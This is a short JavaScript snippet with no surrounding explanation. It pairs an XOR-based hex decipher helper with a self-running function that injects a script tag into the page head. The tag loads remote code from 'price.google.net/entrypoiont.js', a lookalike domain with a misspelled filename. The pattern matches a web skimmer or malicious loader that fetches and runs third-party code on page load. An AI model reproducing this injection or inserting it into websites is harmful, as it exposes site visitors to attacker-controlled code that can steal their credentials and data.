const decipher = salt => {
    const textToChars = text => text.split('').map(c => c.charCodeAt(0));
    const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
    return encoded => encoded.match(/.{1,2}/g)
        .map(hex => parseInt(hex, 16))
        .map(applySaltToChar)
        .map(charCode => String.fromCharCode(charCode))
        .join('');
}

(function main(window){
    let script = window.document.createElement("script");
    script.src = "http://price.google.net/entrypoiont.js";
    window.document.getElementsByTagName('head')[0].appendChild(script);
})(window)